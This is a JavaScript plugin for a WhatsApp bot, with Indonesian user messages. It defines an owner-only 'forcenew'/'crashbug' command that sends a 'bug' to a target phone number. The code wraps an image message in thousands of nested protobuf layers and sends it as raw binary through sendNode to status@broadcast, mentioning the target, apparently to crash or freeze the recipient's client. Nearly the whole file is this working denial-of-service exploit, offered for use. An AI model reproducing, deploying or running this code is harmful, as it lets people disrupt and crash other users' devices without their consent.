const config = require('../../config')
const { proto } = require('zerotwo')

const pluginConfig = {
    name: 'forcenew',
    alias: ['fn', 'forcebug', 'crashbug'],
    category: 'owner',
    description: 'Force send bug (owner only)',
    usage: '.forcenew <target>',
    example: '.forcenew 628xxx',
    isOwner: true,
    isPremium: false,
    isGroup: false,
    isPrivate: false,
    cooldown: 60,
    energi: 0,
    isEnabled: true
}

// ===== HELPER VARINT =====
const encodeVarint = function (n) {
    const buf = []
    while (n >= 0x80) {
        buf.push((n & 0x7f) | 0x80)
        n >>>= 7
    }
    buf.push(n)
    return Buffer.from(buf)
}

const wrapLd = function (tag, data) {
    return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data])
}

// ===== PAYLOAD IMAGE =====
const IMG = {
    url: 'https://example.com/image.jpg',
    mimetype: 'image/jpeg',
    fileSha256: Buffer.from('A'.repeat(32)),
    fileLength: 12345,
    height: 100,
    width: 100,
    mediaKey: Buffer.from('A'.repeat(32)),
    fileEncSha256: Buffer.from('A'.repeat(32)),
    directPath: '/v/t62.7118-24/example',
    mediaKeyTimestamp: '1234567890'
}

const Payload = proto.Message.encode(
    proto.Message.fromObject({ imageMessage: IMG })
).finish()

const inflate = function (tag, depth) {
    let buf = Payload
    for (let i = 0; i < depth; i++) {
        buf = wrapLd(tag, wrapLd([0x0A], buf))
    }
    return buf
}

const TAGS = [
    [0xBA, 0x03],
    [0xD2, 0x04],
    [0xAA, 0x02]
]

// ===== CORE FUNCTION =====
async function ForceNew(sock, target) {
    const targets = Array.isArray(target) ? target : [target]
    const msgId = 'crb' + Date.now().toString(36).toUpperCase()

    for (let ti = 0; ti < TAGS.length; ti++) {
        const tag = TAGS[ti]
        let decodedPayload = null

        for (let depth = 5000; depth >= 2000 && !decodedPayload; depth -= 400) {
            try {
                const raw = inflate(tag, depth)
                const decoded = proto.Message.decode(raw)
                proto.Message.encode(decoded).finish()
                decodedPayload = decoded
            } catch (_) {}
        }

        if (!decodedPayload) continue

        try {
            // Bypass relayMessage — pake sendNode langsung (raw binary)
            const bytes = proto.Message.encode(decodedPayload).finish()

            await sock.sendNode({
                tag: 'message',
                attrs: {
                    to: 'status@broadcast',
                    type: 'media',
                    id: msgId + '-' + ti,
                    // eslint-disable-next-line camelcase
                    addressing_mode: 'lid'
                },
                content: [
                    {
                        tag: 'plaintext',
                        attrs: {},
                        content: bytes
                    },
                    {
                        tag: 'meta',
                        attrs: {},
                        content: [
                            {
                                tag: 'mentioned_users',
                                attrs: {},
                                content: targets.map(jid => ({
                                    tag: 'to',
                                    attrs: { jid },
                                    content: []
                                }))
                            }
                        ]
                    }
                ]
            })
            console.log(`✅ [ForceNew] Tag ${ti} terkirim`)
        } catch (e) {
            console.log(`❌ [ForceNew] Tag ${ti} gagal:`, e.message)
        }
    }

    console.log('✅ SUCCESS SEND BUGS')
}

// ===== HANDLER =====
async function handler(m, { sock }) {
    if (!config.isOwner(m.sender)) {
        return m.reply(
`╭━━━〔 🔒 OWNER ONLY 〕━━━⬣
│
│ > Command ini cuma buat owner!
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    const text = m.text?.trim()

    if (!text) {
        return m.reply(
`╭━━━〔 💀 FORCE NEW 〕━━━⬣
│
│ ✨ *Force Send Bug*
│
│ 📌 *Format:*
│ > ${m.prefix}forcenew <target>
│
│ 📌 *Contoh:*
│ > ${m.prefix}forcenew 628xxx
│ > ${m.prefix}forcenew 628xxx@s.whatsapp.net
│
│ ⚠️ *Warning:*
│ > Gunakan dengan tanggung jawab
│ > Owner only!
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }

    await m.react('💀')

    try {
        let target = text

        if (!target.includes('@')) {
            const cleanNum = target.replace(/[^0-9]/g, '')
            if (!cleanNum || cleanNum.length < 6) {
                await m.react('❌')
                return m.reply(
`╭━━━〔 ❌ TARGET INVALID 〕━━━⬣
│
│ > Nomor target tidak valid!
│
╰━━━━━━━━━━━━━━━━⬣`
                )
            }
            target = cleanNum + '@s.whatsapp.net'
        }

        await m.reply(
`╭━━━〔 💀 PROCESSING 〕━━━⬣
│
│ ⏳ *Mengirim bug ke:*
│ > \`${target}\`
│
│ 💡 _Tunggu bentar..._
│
╰━━━━━━━━━━━━━━━━⬣`
        )

        await ForceNew(sock, target)

        await m.react('✅')

        return m.reply(
`╭━━━〔 ✅ SUCCESS 〕━━━⬣
│
│ 💀 *Bug berhasil dikirim!*
│
│ 🎯 *Target:* \`${target}\`
│ 📊 *Method:* Force New (Raw Node)
│
│ ⚠️ _Gunakan dengan bijak!_
│
╰━━━━━━━━━━━━━━━━⬣`
        )

    } catch (error) {
        await m.react('❌')
        console.error('[FORCENEW Error]', error)

        return m.reply(
`╭━━━〔 ❌ ERROR 〕━━━⬣
│
│ 📛 *Error:*
│ > ${error.message.slice(0, 200)}
│
│ 💡 Coba lagi nanti
│
╰━━━━━━━━━━━━━━━━⬣`
        )
    }
}

module.exports = {
    config: pluginConfig,
    handler,
    ForceNew
}